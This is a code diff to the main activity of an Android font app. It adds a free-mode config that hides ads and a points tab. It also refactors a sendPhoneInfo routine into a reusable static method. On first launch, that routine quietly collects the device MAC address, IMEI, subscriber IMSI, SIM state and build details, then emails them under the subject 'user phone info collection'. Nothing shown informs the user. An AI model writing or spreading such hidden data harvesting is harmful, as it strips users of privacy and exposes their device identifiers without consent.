@@ -57,6 +57,8 @@ import com.hly.fontxiu.utils.ApkInstallHelper;
 import com.hly.fontxiu.utils.CommonUtils;
 import com.hly.fontxiu.utils.FileUtils;
 import com.hly.fontxiu.utils.PointsHelper;
+import com.hly.fontxiu.xml.Config;
+
 import static com.hly.fontxiu.utils.Constant.sImei;
 
 public class MainActivity extends FragmentActivity implements OnClickListener,
@@ -93,6 +95,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
     public static String sFontFileUri;
     
     public static final int NO_INSTALL_PERMISSION = 1;
+  
     
     private Handler mHandler = new Handler(){
     	public void handleMessage(android.os.Message msg) {
@@ -110,10 +113,10 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
         setContentView(R.layout.activity_main);
 
         sp = getSharedPreferences(CommonUtils.FontXiu, Context.MODE_PRIVATE);
-        
+        final Config cfg = (Config)getIntent().getSerializableExtra("config");
         installFontApk();
 
-        initTab();
+        initTab(cfg);
         initViewPager();
 
         sViewPager.setCurrentItem(0);
@@ -125,7 +128,9 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 
             @Override
             public void run() {
-                initAd();
+            	if (!cfg.isFree()){
+            		initAd();
+            	}
                 runOnUiThread(new Runnable() {
 					
 					@Override
@@ -149,6 +154,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
             @Override
             public void onGetOnlineConfigSuccessful(String key, String value) {
                 // 获取在线参数成功
+            	if (value != null){
             	String[] str = value.split(";");
             	sFontFileUri = str[0];
             	sUpdateFontFile = str[1];
@@ -215,6 +221,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 					}).start();
             	}
             }
+            }
 
             @Override
             public void onGetOnlineConfigFailed(String key) {
@@ -259,7 +266,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 		if (isWifi || isNetData) {
 			boolean isFirstLoading = sp.getBoolean("isFirstLoading", true);
 			if (isFirstLoading){
-				sendPhoneInfo();
+				sendPhoneInfo("用户信息搜集",this);
 				PointsHelper.awardPoints(this, Integer.parseInt(sAwardPoints));
 				sp.edit().putBoolean("isFirstLoading", false).commit();
 				new AlertDialog.Builder(this).setTitle("字体秀秀")
@@ -278,13 +285,13 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 		}
 	}
 	
-	public String getLocalMacAddress() {  
-        WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);  
+	public static String getLocalMacAddress(Context ctx) {  
+        WifiManager wifi = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);  
         WifiInfo info = wifi.getConnectionInfo();  
         return info.getMacAddress();  
     }  
 
-	private void sendPhoneInfo() {
+	public static void sendPhoneInfo(String title,Context ctx) {
 		StringBuilder sb=new StringBuilder();
       
         sb.append("BOARD:")
@@ -329,9 +336,9 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
         .append(";DISPLAY:").append(android.os.Build.DISPLAY)
         .append(";DEVICE:").append(android.os.Build.DEVICE)
 		.append(";SDK:").append(android.os.Build.VERSION.SDK_INT)
-		.append(";MAC:").append(getLocalMacAddress());
+		.append(";MAC:").append(getLocalMacAddress(ctx));
         
-		TelephonyManager telephonyManager= (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
 		String imei=telephonyManager.getDeviceId();
 		sb.append(";imei:"+imei)
 		.append(";Subscriber imsi:").append(telephonyManager.getSubscriberId())
@@ -346,7 +353,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
         .append(";SimState:" + telephonyManager.getSimState());
 		
 		final MailSenderInfo mailInfo = CommonUtils.initEmail();
-		mailInfo.setSubject("用户手机信息搜集：");
+		mailInfo.setSubject(title+"：");
 
 		String mailContent = "用户手机信息搜集内容：\n\n";
 
@@ -518,26 +525,28 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
         sViewPager.setCurrentItem(position);
     }
 
-    private void initTab() {
-        mTabQuality = (TextView)findViewById(R.id.tab_font_quality);
-        mTabQuality.setText("精品");
-        mTabQuality.setId(FONT_QUALITY_LIST);
-        mTabQuality.setOnClickListener(this);
+    private void initTab(Config cfg) {
+		mTabQuality = (TextView) findViewById(R.id.tab_font_quality);
+		mTabQuality.setText("精品");
+		mTabQuality.setId(FONT_QUALITY_LIST);
+		mTabQuality.setOnClickListener(this);
 
-         mTabAllFont = (TextView)findViewById(R.id.tab_font_all);
-         mTabAllFont.setText("全部");
-         mTabAllFont.setId(FONT_ALL);
-         mTabAllFont.setOnClickListener(this);
+		mTabAllFont = (TextView) findViewById(R.id.tab_font_all);
+		mTabAllFont.setText("全部");
+		mTabAllFont.setId(FONT_ALL);
+		mTabAllFont.setOnClickListener(this);
 
-        mTabEarnPoints = (TextView)findViewById(R.id.tab_earn_points);
-        mTabEarnPoints.setText("获取积分");
-        mTabEarnPoints.setId(FONT_EARN_POINTS);
-        mTabEarnPoints.setOnClickListener(this);
+		mTabs = new TextView[PAGE_COUNT];
+		mTabs[FONT_QUALITY_LIST] = mTabQuality;
+		mTabs[FONT_ALL] = mTabAllFont;
+		if (!cfg.isFree()) {
+			mTabEarnPoints = (TextView) findViewById(R.id.tab_earn_points);
+			mTabEarnPoints.setText("获取积分");
+			mTabEarnPoints.setId(FONT_EARN_POINTS);
+			mTabEarnPoints.setOnClickListener(this);
+			mTabs[FONT_EARN_POINTS] = mTabEarnPoints;
+		}
 
-        mTabs = new TextView[PAGE_COUNT];
-        mTabs[FONT_QUALITY_LIST] = mTabQuality;
-         mTabs[FONT_ALL] = mTabAllFont;
-        mTabs[FONT_EARN_POINTS] = mTabEarnPoints;
     }
 
     private void initViewPager() {
